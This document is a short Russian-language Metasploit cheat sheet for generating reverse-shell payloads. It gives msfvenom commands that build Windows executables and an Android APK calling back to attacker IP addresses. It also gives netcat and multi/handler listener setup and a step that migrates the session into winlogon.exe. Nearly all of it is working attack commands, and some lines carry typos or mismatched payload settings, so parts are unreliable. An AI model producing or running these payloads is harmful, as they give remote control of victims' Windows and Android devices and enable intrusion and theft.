# MetaSploit

Создаем реверс шелл для виндовс
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f exe -o sh1.exe


проверено для netcat и для метасплойт

msfvenom -p windows/shell_reverse_tcp LHOST=10.18.35.17 LPORT=7777 -f exe -o Zero.exe
rlwrap nc -lvnp 7777

вместо неткат для метасплойт

use exploit/multi/handler

migrate -N winlogon.exe

run



Для АНДРОИД
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport= 5555 R> Test.apk

use exploit/mulit/handler

set payload windows/meterpreter/reverse_tcp

set lhost 192.168.0.9

set lport 4444

exploit
